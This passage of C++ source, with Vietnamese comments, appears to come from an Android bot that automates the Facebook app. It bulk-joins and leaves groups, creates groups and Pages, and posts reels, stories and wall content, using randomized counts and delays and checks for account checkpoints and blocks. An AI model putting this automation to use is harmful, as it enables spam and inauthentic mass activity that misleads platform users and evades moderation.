            if (element == "//*[@content-desc='Joined' or @text ='Joined']")
                return isTapJoinGroup;
            if (element == "//*[@content-desc='Cancel request' or @text ='Cancel request']") {
                if (existNode("//*[@text='Answer questions' or @content-desc= 'Answer questions']",
                              xml)) {
                    tap("//*[@text='Answer questions' or @content-desc= 'Answer questions']", xml);
                    delay(2);
                    continue;
                }

                return isTapJoinGroup;
            }
            if (element ==
                "//*[@content-desc='Participant questions' or @text='Participant questions']" ||
                element == "//*[@text='Answer questions' or @content-desc= 'Answer questions']") {
                if (ckbTuDongTraLoiCauHoi)
                    answerQuestion(txtCauTraLoi);
                return true;
            }
        }
        return false;
    }

    ResultScreen actionJoinGroupSuggest() {
        //input người dùng nhập
        int nudSoLuongFrom = action.getInt("nudSoLuongFrom");
        int nudSoLuongTo = action.getInt("nudSoLuongTo");
        int nudDelayFrom = action.getInt("nudDelayFrom");
        int nudDelayTo = action.getInt("nudDelayTo");
        bool ckbTuDongTraLoiCauHoi = action.getBool("ckbTuDongTraLoiCauHoi");
        vector<string> txtCauTraLoi = action.getList("txtCauTraLoi");

        //xử lý input, khai báo thêm biến cần thiết
        int soLuong = Common::ranNumber(nudSoLuongFrom, nudSoLuongTo);
        int countSuccess = 0;

        //goto
        if (!gotoGroup())
            return ERROR;
        delay(2);
        updateLine("Join Group " + to_string(countSuccess + 1) + "/" + to_string(soLuong));
        //timestart
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        //loop
        while (true) {
            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;
            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            if (screen == "FB_ANOTHER_GROUP") {
                back();
                delay(2);
                continue;
            }

            string element = existNodes(0, xml, {
                    "//*[@content-desc='Pinned' or @text = 'Pinned']",
                    "//*[@content-desc='Group event' or @text ='Group event']",//thêm các trường hợp nếu acc khác vào tab khacs
                    "//*[@content-desc='To review' or @text ='To review']",
                    "//android.widget.Button[@content-desc='Post menu']",

                    "//*[@content-desc='Join' or @text ='Join']",
                    "//*[@content-desc ='Answer questions' or @content-desc='Participant questions' or @text='Participant questions']",
                    "//*[@text ='Exit without answering?']",
            });

            if (screen == "FB_GROUP_SEARCH" ||
                element == "//*[@content-desc='Pinned' or @text = 'Pinned']" ||
                element == "//*[@content-desc='Group event' or @text ='Group event']" ||
                element == "//*[@content-desc='To review' or @text ='To review']" ||
                element == "//android.widget.Button[@content-desc='Post menu']") {
                tap("//*[@content-desc='Discover' or @ text = 'Discover']", xml);
                delay(2);
                continue;
            }

            if (element == "//*[@content-desc='Join' or @text ='Join']") {
                tapCenter(element, xml);
                delay(2);

                delay(nudDelayFrom, nudDelayTo,
                      "Join group " + to_string(countSuccess + 1) + "/" + to_string(soLuong) +
                      " success, delay");
                countSuccess++;
                if (countSuccess >= soLuong)
                    return DONE;
                updateLine("Join Group " + to_string(countSuccess + 1) + "/" + to_string(soLuong));
                timeStart = high_resolution_clock::now();
                continue;
            }

            if (element ==
                "//*[@content-desc ='Answer questions' or @content-desc='Participant questions' or @text='Participant questions']") {
                if (ckbTuDongTraLoiCauHoi)
                    answerQuestion(txtCauTraLoi);
                else
                    tap("//android.widget.Button[@content-desc='Back' or @content-desc='Close']",
                        xml);//có thể laf nút back //xử lý trường hợp ngươời dùng không muốn trả ời câu hỏi

                delay(2);
                continue;
            }
            if (element == "//*[@text ='Exit without answering?']") {
                tap("//android.widget.Button[@text ='EXIT']");
                delay(2);
                continue;
            }

            updateLine("Join group " + to_string(countSuccess + 1) + "/" + to_string(soLuong) +
                       ", swipe");
            if (swipeAndScreenNotChange())
                break;
        }
        return NOMAP;
    }

    //Thành công rời nhóm: Tính vào kết quả thành công.
    //Không phải thành viên: Bỏ qua.
    //Nhóm không tồn tại: Ghi log, bỏ qua.
    //Không thể rời nhóm: Ghi log lỗi và chuyển tiếp.
    //Giới hạn thao tác: Dừng task, xử lý tài khoản.
    //Lỗi hệ thống/mạng: Thử lại hoặc bỏ qua.
    ResultScreen actionLeaveGroup() {
        //input người dùng nhập
        int nudSoLuongFrom = action.getInt("nudSoLuongFrom");
        int nudSoLuongTo = action.getInt("nudSoLuongTo");
        int nudDelayFrom = action.getInt("nudDelayFrom");
        int nudDelayTo = action.getInt("nudDelayTo");

        //xử lý input, khai báo thêm biến cần thiết
        int soLuong = Common::ranNumber(nudSoLuongFrom, nudSoLuongTo);
        int countSuccess = 0;

        //goto
        if (!gotoGroup())
            return ERROR;
        delay(2);

        updateLine("Leave group " + to_string(countSuccess + 1) + "/" + to_string(soLuong));
        //timestart
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        //loop
        while (true) {
            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;

            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            string element = existNodes(0, xml, {
                    "//*[@class='android.widget.Button' and @content-desc ='Settings']",
                    "//*[@content-desc='Leave groups that no longer interest you.' or @text ='Leave groups that no longer interest you.']",
                    "//*[@text='Leave' or @content-desc='Leave']",
                    "//*[@class='android.widget.Button' and @text ='LEAVE GROUP']",
                    "//*[@content-desc='Suggested for you' or @text='Suggested for you']",
                    "//*[@content-desc='You have left this group' or @text='You have left this group']",//thêm trường hợp màn hình hiển thị You have left this group
            });
            if (element == "//*[@class='android.widget.Button' and @content-desc ='Settings']") {
                tap(element, xml);
                delay(2);
                continue;
            }
            if (element ==
                "//*[@content-desc='Leave groups that no longer interest you.' or @text ='Leave groups that no longer interest you.']") {
                tap(element, xml);
                delay(2);
                continue;
            }
            if (element == "//*[@text='Leave' or @content-desc='Leave']") {
                tap(element, xml);
                delay(2);
                continue;
            }
            if (element == "//*[@class='android.widget.Button' and @text ='LEAVE GROUP']") {
                tap(element, xml);
                delay(2);

                delay(nudDelayFrom, nudDelayTo,
                      "Leave group " + to_string(countSuccess + 1) + "/" + to_string(soLuong) +
                      " success, delay");
                countSuccess++;
                if (countSuccess >= soLuong)
                    return DONE;
                updateLine("Leave group " + to_string(countSuccess + 1) + "/" + to_string(soLuong));

                back();
                timeStart = high_resolution_clock::now();
                continue;
            }
            if (element == "//*[@content-desc='Suggested for you' or @text='Suggested for you']" ||
                element ==
                "//*[@content-desc='You have left this group' or @text='You have left this group']") {
                back();
                delay(2);
                continue;
            }

            updateLine("Leave group " + to_string(countSuccess + 1) + "/" + to_string(soLuong) +
                       ", swipe");
            if (swipeAndScreenNotChange())
                break;
        }
        return NOMAP;
    }

    ResultScreen actionCreateGroup() {
        //input người dùng nhập
        int nudSoLuongFrom = action.getInt("nudSoLuongFrom");
        int nudSoLuongTo = action.getInt("nudSoLuongTo");
        int nudDelayFrom = action.getInt("nudDelayFrom");
        int nudDelayTo = action.getInt("nudDelayTo");
        vector<string> txtTenNhom = action.getList("txtTenNhom");

        //xử lý input, khai báo thêm biến cần thiết
        int soLuong = Common::ranNumber(nudSoLuongFrom, nudSoLuongTo);
        int countSuccess = 0;
        vector<string> txtTenNhomClone = vector<string>(txtTenNhom);
        bool isInputGroupNameDone = false;
        //goto
        if (!gotoGroup())
            return ERROR;
        delay(2);
        updateLine("Create group " + to_string(countSuccess + 1) + "/" + to_string(soLuong));
        //timestart
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        //loop
        while (true) {
            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;

            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            string element = existNodes(0, xml, {
                    "//android.widget.Button[@content-desc ='Create actions entry point']",
                    "//*[@content-desc='Create a public or private group.' or @text ='Create a public or private group.']",
                    "//*[@content-desc='Choose privacy' or @text ='Choose privacy']",
                    "//*[@content-desc='Create group' and @clickable='true']",
                    "//*[@text='Creating group…']",
                    "//*[@content-desc='Invite People' or @text ='Invite People']",
                    "//*[@text='Something went wrong, please try again.']",
            });
            if (element == "//android.widget.Button[@content-desc ='Create actions entry point']") {
                tap(element, xml);
                delay(2);
                continue;
            }
            if (element ==
                "//*[@content-desc='Create a public or private group.' or @text ='Create a public or private group.']") {
                tap(element, xml);
                delay(2);
                continue;
            }
            // 1. Nhập tên nếu chưa làm
            if (!isInputGroupNameDone) {
                if (existNode("//*[@text='Name your group']", xml)) {
                    if (txtTenNhomClone.empty())
                        txtTenNhomClone = vector<string>(txtTenNhom);
                    string tenNhom = Common::ranItem(txtTenNhomClone);
                    Common::removeItem(txtTenNhomClone, tenNhom);

                    inputText("//*[@text='Name your group']", tenNhom);
                    delay(1);
                    hideKeyboard();
                    delay(1);
                    isInputGroupNameDone = true;
                    continue;
                }
            }

            if (element == "//*[@content-desc='Choose privacy' or @text ='Choose privacy']") {
                if (existNode("//*[contains(@content-desc,'Public, Anyone can see who')]", xml)) {
                    tap("//*[contains(@content-desc,'Public, Anyone can see who')]", xml);
                    delay(1);
                    tapCenter("//*[@text='Done' or @content-desc='Done']", xml);
                    delay(2);
                    continue;
                }
                tap(element, xml);
                delay(2);
                continue;
            }
            if (element == "//*[@content-desc='Create group' and @clickable='true']") {
                tap(element, xml);
                delay(2);
                continue;
            }
            if (element == "//*[@text='Creating group…']") {
                delay(2);
                continue;
            }
            if (element == "//*[@content-desc='Invite People' or @text ='Invite People']") {
                delay(nudDelayFrom, nudDelayTo,
                      "Create group " + to_string(countSuccess + 1) + "/" + to_string(soLuong) +
                      " success, delay");
                countSuccess++;
                if (countSuccess >= soLuong)
                    return DONE;
                isInputGroupNameDone = false;
                updateLine(
                        "Create group " + to_string(countSuccess + 1) + "/" + to_string(soLuong));
                gotoGroup();//làm bước tiếp theo
                timeStart = high_resolution_clock::now();
                continue;
            }
            if (element == "//*[@text='Something went wrong, please try again.']")
                break;
        }
        return NOMAP;
    }

    bool gotoCreatePage() {
        if (!gotoMenu())
            return false;
        delay(2);

        string xml = dumpXml();
        string screen = handleScreen(xml);
        if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
            return false;
        if (Common::strContains(screen, "_POPUP_"))
            return false;
        if (screen == "FB_SESSION_EXPIRED")
            return false;

        string element = existNodes(3, xml, {
                "//*[contains(@content-desc,'Pages')]",
        });
        if (element.empty()) {
            string xpathSeeMore = "//*[@content-desc='See more']";
            string xpathPage = "//*[contains(@content-desc,'Pages')]";
            if (existNode(xpathSeeMore, xml)) {
                tap(xpathSeeMore, xml);
                delay(2);
            }
            swipeAndTap(xpathPage, xml, 3);
            delay(2);
            return true;
        }
        tap(element, xml);
        delay(2);
        return true;
    }

    ResultScreen actionCreatePage() {
        //input người dùng nhập
        int nudSoLuongFrom = action.getInt("nudSoLuongFrom");
        int nudSoLuongTo = action.getInt("nudSoLuongTo");
        int nudDelayFrom = action.getInt("nudDelayFrom");
        int nudDelayTo = action.getInt("nudDelayTo");
        vector<string> txtTenPage = action.getList("txtTenPage");
        vector<string> txtCategory = action.getList("txtCategory");

        //xử lý input, khai báo thêm biến cần thiết
        int soLuong = Common::ranNumber(nudSoLuongFrom, nudSoLuongTo);
        int countSuccess = 0;
        int maxTapCreate = 3;
        vector<string> txtTenPageClone = vector<string>(txtTenPage);

        //goto
        if (!gotoCreatePage())
            return ERROR;
        delay(2);
        updateLine("Create page " + to_string(countSuccess + 1) + "/" + to_string(soLuong));
        //timestart
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        //loop
        while (true) {
            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;

            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            string element = existNodes(0, xml, {
                    "//*[@class='android.widget.Button' and @content-desc='Create' and @clickable ='true']",//Tao PAge //sửa lỗi không tạo category vì bị trùng create trong What category best describes
                    "//*[@content-desc='Grow as a business, creator or organization.']",//Chon Public
                    "//*[@content-desc='Get Started' or @text='Get Started']",// thêm trường hợp Get Started nhiều acc không có
                    "//*[@content-desc=\"What's the name of your Page?\" or @text = \"What's the name of your Page?\"]",//Dien ten Page
                    "//*[contains(@text,\"is invalid. Please choose a different name and try again.\")]",// name khong hop le
                    "//*[contains(@text,'What category best describes ') or contains(@content-desc ,'What category best describes ')]",// Dien the loai
                    "//*[@content-desc='Promote your products or services' or @text ='Promote your products or services']",//Tao, gioi thieu san pham va dich vu
                    "//*[@content-desc='Next' or @text ='Next']",//cac buoc set up cho page(next bo qua het)
                    "//*[@content-desc='Done' or @text ='Done']"
            });

            if (element == "//*[@content-desc='Grow as a business, creator or organization.']") {
                tap(element, xml);
                delay(2);
                tap("//*[@content-desc='Next' or @text ='Next']");
                delay(2);
                continue;
            }

            if (element ==
                "//*[@class='android.widget.Button' and @content-desc='Create' and @clickable ='true']"
                || element == "//*[@content-desc='Get Started' or @text='Get Started']") {
                tap(element, xml);
                delay(2);
                continue;
            }

            if (element ==
                "//*[@content-desc=\"What's the name of your Page?\" or @text = \"What's the name of your Page?\"]") {
                if (txtTenPageClone.empty())
                    txtTenPageClone = vector<string>(txtTenPage);
                string tenPage = Common::ranItem(txtTenPageClone);
                Common::removeItem(txtTenPageClone, tenPage);

                inputText(
                        "//android.widget.EditText[@class='android.widget.EditText' and @text ='']",
                        tenPage);
                delay(1);
                tap("//*[@content-desc='Next' or @text ='Next']");
                delay(2);
                if (existNode("//*[@content-desc='Error for: Page name']", xml, 3))
                    return NOMAP;
                continue;
            }
            if (element ==
                "//*[contains(@text,\"is invalid. Please choose a different name and try again.\")]") //sai tên
                return NOMAP;

            if (element ==
                "//*[contains(@text,'What category best describes ') or contains(@content-desc ,'What category best describes ')]") {
                string categoryPage = Common::ranItem(txtCategory);
                inputText(
                        "//android.widget.EditText[@class='android.widget.EditText' and @text ='Search for categories']",
                        categoryPage);
                delay(1);
                tap("(//*[@class='android.view.ViewGroup']//*[@class='android.view.View'])[3]");//chon nut the loai
                delay(2);
                tap("//*[@content-desc='Create' or @text ='Create'] or //*[@content-desc='Next' or @text ='Next']");// Co 2 truong hop la nut next va nut Create
                delay(2);
                waitNodeHide(
                        "//*[@content-desc='Create' or @text ='Create'] or //*[@content-desc='Next' or @text ='Next']",
                        10);
                maxTapCreate--;
                if (maxTapCreate < 0)
                    return NOMAP;
                continue;
            }
            if (element ==
                "//*[@content-desc='Promote your products or services' or @text ='Promote your products or services']") {
                tap(element, xml);
                delay(1);
                tap("//*[@content-desc='Continue' or @text = 'Continue']");
                delay(2);
                continue;
            }
            if (element == "//*[@content-desc='Next' or @text ='Next']") {
                tap(element, xml);
                delay(2);
                continue;
            }
            if (element == "//*[@content-desc='Done' or @text ='Done']") {
                tap(element, xml);
                delay(2);

                maxTapCreate--;
                if (maxTapCreate < 0)
                    break;

                delay(nudDelayFrom, nudDelayTo,
                      "Create page " + to_string(countSuccess + 1) + "/" + to_string(soLuong) +
                      " success, delay");
                countSuccess++;
                if (countSuccess >= soLuong)
                    return DONE;

                updateLine("Create page " + to_string(countSuccess + 1) + "/" + to_string(soLuong));
                gotoPage();
                timeStart = high_resolution_clock::now();
                maxTapCreate = 3;
                continue;
            }
        }
        return NOMAP;
    }

    ResultScreen actionUpReel() {
        //input người dùng
        int nudSoLuongFrom = action.getInt("nudSoLuongFrom"); // Số lượng from
        int nudSoLuongTo = action.getInt("nudSoLuongTo");     // Số lượng to
        int nudDelayFrom = action.getInt("nudDelayFrom");     // Thời gian giãn cách from
        int nudDelayTo = action.getInt("nudDelayTo");         // Thời gian giãn cách to
        bool ckbVanBan = action.getBool("ckbVanBan");
        string postContentId = action.getString("postContentId");
        string galleryId = action.getString("galleryId");
        int nudTimeoutLoadVideo = action.getInt("nudTimeoutLoadVideo");
        bool cbbWhenTimeout = action.getBool("cbbWhenTimeout");
        bool ckbPostFileName = action.getBool("ckbPostFileName");
        bool ckbXoaAnhDaDung = action.getBool("ckbXoaAnhDaDung");

        //input biến xử lý nếu cần thiết
        int soLuong = Common::ranNumber(nudSoLuongFrom, nudSoLuongTo);
        int countSuccess = 0;
        string reelName;

        vector<MediaS3> lstMedia = getScriptMedia(galleryId);

        if (lstMedia.empty())
            return ERROR;

        //goto
        if (!gotoCreateReel())
            return ERROR;
        delay(2);

        updateLine("Up reels " + to_string(countSuccess + 1) + "/" + to_string(soLuong));

        //timestart
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        //loop
        while (true) {
            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;

            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            string element = existNodes(0, xml, {
//                    "(//*[@class='android.widget.Button']/*[@class='android.widget.Button' and @selected ='false'])[1]",
                    "(//*[contains(@content-desc,'Video')])[1]",
                    "//*[@content-desc='Share now' or @text ='Share now' or @content-desc='Share reel' or @text ='Share reel']",
                    "//*[@text='Continue editing your last reel?']",
            });


            if (element ==
                "(//*[contains(@content-desc,'Video')])[1]") {
                tap(element, xml);
                delay(2);
                tap("//*[@content-desc='Next' or @text ='Next']");
                delay(2);
                continue;
            }
            if (element ==
                "//*[@content-desc='Share now' or @text ='Share now' or @content-desc='Share reel' or @text ='Share reel']") {
                if (ckbVanBan) {
                    updateLine("caption...");
                    handleTextReel(postContentId);
                }

                if (ckbPostFileName) {
                    string fileName = action.galleryName;
                    size_t pos2 = fileName.find("&");
                    postContentId = fileName;
                    if (pos2 != std::string::npos) {
                        postContentId = fileName.substr(0, pos2);
                        reelName = fileName.substr(pos2 + 1);
                    }
                    updateLine("Caption by file name...");
                    inputText("//android.widget.EditText", postContentId);
                    hideKeyboard();
                    delay(1);
                }
                tap(element, xml);
                if (existNode("//*[@text='Easily add to your story']", xml, 3)) {
                    tap("//*[@text='NOT NOW']");
                    delay(2);
                }
                //Call function loading reel after tab "Share".
                updateLine("Loading up reels...");
                bool isSuccess = handleLoadingUpReel(nudTimeoutLoadVideo, cbbWhenTimeout);
                if (!isSuccess)
                    return ERROR;

                delay(nudDelayFrom, nudDelayTo);
                countSuccess++;
                if (countSuccess >= soLuong){
                    if (ckbXoaAnhDaDung) {
                        deleteScriptMedia(lstMedia);
                    }
                    return DONE;
                }

                updateLine("Up reels " + to_string(countSuccess + 1) + "/" + to_string(soLuong));
                timeStart = high_resolution_clock::now();
                if (!gotoCreateReel())
                    return ERROR;
                continue;
            }
            if (element == "//*[@text='Continue editing your last reel?']") {
                tap("//*[@text='DISCARD']");
                delay(2);
                continue;
            }
        }
        return NOMAP;
    }

    //handle loading up reel
    bool handleLoadingUpReel(int nudTimeoutLoadVideo, int cbbWhenTimeout) {
        waitNodeHide(
                "//*[@content-desc='Share now' or @text ='Share now' or @content-desc='Share reel' or @text ='Share reel']",
                30);
        auto timeStart = high_resolution_clock::now();
        while (true) {
            string xml = dumpXml();
            //Kiểm tra nếu progress bar đã biến mẩt
            if (!existNode(
                    "//android.view.ViewGroup/android.widget.ImageView/following-sibling::android.widget.ProgressBar",
                    xml)) {
                Base::updateLine("Up reel success...!");
                return true;
            }
            //Kiểm tra timeout
            if (Common::hasExceededTimeout(timeStart, nudTimeoutLoadVideo)) {

                if (cbbWhenTimeout == 0) {
                    Base::updateLine("up reel success...!");
                    return true;
                } else {
                    Base::updateLine("up reel fail...!");
                    return false;
                }
                break;
            }
            delay(2);
        }
        return false;
    }

    //handle input text up reel
    bool handleTextReel(string txtNoiDung) {
        //time start
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        //loop
        while (true) {
            string xml = dumpXml();
            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            string element = existNodes(0, xml, {
                    "//android.widget.EditText[@text='Describe your reel. You can also add hashtags here…']",
            });
            if (element ==
                "//android.widget.EditText[@text='Describe your reel. You can also add hashtags here…']") {
                // Nhập nội dung
                auto [success, content, itemId] = getScriptContent(txtNoiDung);

                if (!success) {
                    saveStatusAcc("Get Script Content", "Failed", 5, Task::FAIL);
                    return NOMAP; // chay tiep hoac dung lai
                }

                // comment, dang bai, .....
                //  Common::NLog("Content: " + content, "handleTest");
                inputText("//android.widget.EditText", content);
                // xoa content sau khi su dung

                if (!itemId.empty()) {
                    deleteScriptContent(itemId);
                }

                delay(1);
                hideKeyboard();
                return true;
            }
        }
        return false;
    }


    ResultScreen actionUpStory() {
        //input người dùng nhập
        int nudSoLuongFrom = action.getInt("nudSoLuongFrom"); // Số lượng from
        int nudSoLuongTo = action.getInt("nudSoLuongTo");     // Số lượng to
        int nudDelayFrom = action.getInt("nudDelayFrom");     // Thời gian giãn cách from
        int nudDelayTo = action.getInt("nudDelayTo");         // Thời gian giãn cách to
        int typeStory = action.getInt("typeStory");
        //vector<string> txtNoiDung = action.getList("txtNoiDung");
        string postContentId = action.getString("postContentId");
        bool ckbGanLink = action.getBool("ckbGanLink"); // Có gắn link vào story không?
        vector<string> txtLink = action.getList("txtLink");
        bool ckbUseBackground = action.getBool("ckbUseBackground");
        string galleryId = action.getString("galleryId");

        //input thêm biến xử lý nếu cần thiết
        int countSuccess = 0;
        int soLuong = Common::ranNumber(nudSoLuongFrom, nudSoLuongTo);
        //string textNoiDung = Common::ranItem(txtNoiDung);
        string textLink = Common::ranItem(txtLink);

        //goto
        if (!gotoCreateStory())
            return ERROR;
        delay(2);

        updateLine("Create Story " + to_string(countSuccess + 1) + "/" + to_string(soLuong));
        //timestart
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;
        //loop
        while (true) {

            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;
            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            switch (typeStory) {
                case 0:
                    updateLine("up story with text...");
                    handleStoryWithText(postContentId, ckbUseBackground);
                    break;
                case 1:
                    updateLine("up story with media...");
                    handleStoryWithImg(galleryId, textLink, ckbGanLink);
                    break;

            }
            xml = dumpXml();// dump lại màn hình thì sẽ nhấn share được
            string element = existNodes(0, xml, {
                    "//*[@class='android.widget.TextView' and @text ='Share']",

            });
            if (element == "//*[@class='android.widget.TextView' and @text ='Share']") {
                tap(element, xml);
                delay(2);
                if (existNode("//*[@text='Easily add to your story']", xml, 3)) {
                    tap("//*[@text='NOT NOW']");
                    delay(2);
                }
                updateLine("Loading up story...");
                waitNodeHide("//*[@text='Sharing…' or @content-desc='Sharing…']", 60);
                delay(nudDelayFrom, nudDelayTo,
                      "Create Story: " + to_string(countSuccess + 1) + "/" + to_string(soLuong) +
                      " success, delay");
                countSuccess++;
                if (countSuccess >= soLuong)
                    return DONE;
                updateLine(
                        "Create Story " + to_string(countSuccess + 1) + "/" + to_string(soLuong));

                timeStart = high_resolution_clock::now();
                if (!gotoCreateStory())
                    return ERROR;
                continue;
            }
        }
        return NOMAP;
    }

    //Handle up story with text
    bool handleStoryWithText(string textNoiDung, bool ckbUseBackground) {
        //timestart
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        //loop
        while (true) {
            if (Common::hasExceededTimeout(timeStart, timeout)) // Khi timeout
                return false;

            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                return false;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                return false;

            string element = existNodes(0, xml, {
                    "//*[@content-desc='Text' or @text ='Text']",
                    "//android.widget.EditText[@content-desc='Text field']",
                    "//*[@class='android.widget.TextView' and @text ='Share']",
            });

            if (element == "//*[@content-desc='Text' or @text ='Text']") {
                tap(element, xml);
                delay(2);
                continue;
            }
            if (element == "//android.widget.EditText[@content-desc='Text field']") {
                auto [success, content, itemId] = getScriptContent(textNoiDung);

                if (!success) {
                    saveStatusAcc("Get Script Content", "Failed", 5, Task::FAIL);
                    return NOMAP; // chay tiep hoac dung lai
                }

                // comment, dang bai, .....
                // Common::NLog("Content: " + content, "handleTest");

                inputText("//android.widget.EditText", content);
                // xoa content sau khi su dung

                if (!itemId.empty()) {
                    deleteScriptContent(itemId);
                }
                delay(1);
                if (existNode("//*[@content-desc='Select background']", xml) &&
                    ckbUseBackground) {
                    tap("//*[@content-desc='Select background']");
                    delay(2);
                    xml = dumpXml();
                }
                int countNode = getNodes("//*[contains(@content-desc,', background')]", xml).size();
                if (countNode > 0) {
                    int indexNode = Common::ranNumber(1, countNode - 1);
                    if (indexNode == 0)
                        indexNode = 1;
                    tap("(//*[contains(@content-desc,', background')])[" + to_string(indexNode) +
                        "]", xml);
                    delay(2);
                }
                tap("//*[@content-desc='Done' or @text ='Done']");
                delay(2);
                return true;
            }
        }
        return false;
    }

    //Handle up story with img
    bool handleStoryWithImg(string image, string textLink, bool ckbGanLink) {
        vector<MediaS3> lstMedia = getScriptMedia(image);

        if (lstMedia.empty())
            return false;

        updateLine("add media...");
        //timestart
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        //loop
        while (true) {
            if (Common::hasExceededTimeout(timeStart, timeout)) // Khi timeout
                return false;

            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                return false;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                return false;

            string element = existNodes(0, xml, {
                    "//*[@content-desc='Select multiple' or @text = 'Select multiple']",
                    "//*[@content-desc='Gallery, selected, Collapse album list']",
                    "//*[@content-desc='media' or @text='media']",
                    "(//*[@class='android.widget.Button' and @focusable ='true']/*[@class='android.widget.Button' and @selected ='false'])[1]",
                    "//*[@content-desc='Photo collage' or @text='Photo collage']",
                    "//*[@class='android.widget.TextView' and @text ='See more']",
            });
            if (element == "//*[@content-desc='Select multiple' or @text = 'Select multiple']"
                || element == "//*[@content-desc='Gallery, selected, Collapse album list']"
                || element == "//*[@content-desc='media' or @text='media']") {
                tap(element, xml);
                delay(2);
                continue;
            }
            if (element ==
                "(//*[@class='android.widget.Button' and @focusable ='true']/*[@class='android.widget.Button' and @selected ='false'])[1]") {
                tap(element, xml);
                delay(2);
                tap("//*[@content-desc='Next' or @text='Next']");
                delay(2);
                continue;
            }
            if (element == "//*[@content-desc='Photo collage' or @text='Photo collage']") {
                tap(element, xml);
                delay(2);
                continue;
            }
            if (element == "//*[@class='android.widget.TextView' and @text ='See more']") {
                if (ckbGanLink) {
                    updateLine("Add link...");
                    tap(element, xml);
                    delay(2);
                    tap("//*[@class='android.widget.TextView' and @text ='Link']");
                    delay(2);
                    inputText("//android.widget.EditText[@text='Enter link']", textLink);
                    delay(1);
                    tap("//*[@content-desc='Add' or @text = 'Add']");
                    delay(2);
                }
            }
            return true;
        }
        return false;
    }

    ResultScreen actionUpWall() {
        //input người dùng nhập
        int nudSoLuongFrom = action.getInt("nudSoLuongFrom");
        int nudSoLuongTo = action.getInt("nudSoLuongTo");
        int nudDelayFrom = action.getInt("nudDelayFrom");
        int nudDelayTo = action.getInt("nudDelayTo");
        int nudSoLuongAnhFrom = action.getInt("nudSoLuongAnhFrom");
        int nudSoLuongAnhTo = action.getInt("nudSoLuongAnhTo");
        int nudSoLuongTagFrom = action.getInt("nudSoLuongTagFrom");
        int nudSoLuongTagTo = action.getInt("nudSoLuongTagTo");

        string postContentId = action.getString("postContentId");
        string galleryId = action.getString("galleryId");
        vector<string> txtLink = action.getList("txtLink");

        bool ckbUseBackground = action.getBool("ckbUseBackground");
        bool ckbAnh = action.getBool("ckbAnh");
        bool ckbVanBan = action.getBool("ckbVanBan");
        bool ckbTagFriends = action.getBool("ckbTagFriends");
        bool ckbDangLink = action.getBool("ckbDangLink");
        bool ckbXoaLink = action.getBool("ckbXoaLink");

        //xử lý input, khai báo thêm biến cần thiết
        string textLink = Common::ranItem(txtLink);
        if (ckbUseBackground && ckbAnh)
            ckbUseBackground = false;
        int soLuong = Common::ranNumber(nudSoLuongFrom, nudSoLuongTo);
        int countSuccess = 0;
        bool isPrivacyChanged = false;
        bool isClickedFeed = false;

        //goto
        if (!gotoHome())
            return ERROR;
        delay(2);

        //timestart
        auto timeStart = high_resolution_clock::now();
        int timeout = 60;

        updateLine("Up wall " + to_string(countSuccess + 1) + "/" + to_string(soLuong));
        //loop
        while (true) {
            if (Common::hasExceededTimeout(timeStart, timeout))//Khi timeout
                break;

            string xml = dumpXml();
            string screen = handleScreen(xml);
            if (IsLogout() || IsCheckpoint() || IsStop() || IsBlock())
                break;
            if (Common::strContains(screen, "_POPUP_"))
                continue;
            if (screen == "FB_SESSION_EXPIRED")
                break;

            if (!isClickedFeed && !existNode(
                    "//*[@content-desc=\"What's on your mind? Make a post on Facebook\" or @content-desc='Make a post on Facebook']",
                    xml)) {
                tap("//*[contains(@content-desc,'Feed')]");
                delay(2);
                isClickedFeed = true;
                continue;
            }

            string element = existNodes(0, xml, {
                    "//*[@content-desc=\"What's on your mind? Make a post on Facebook\"",
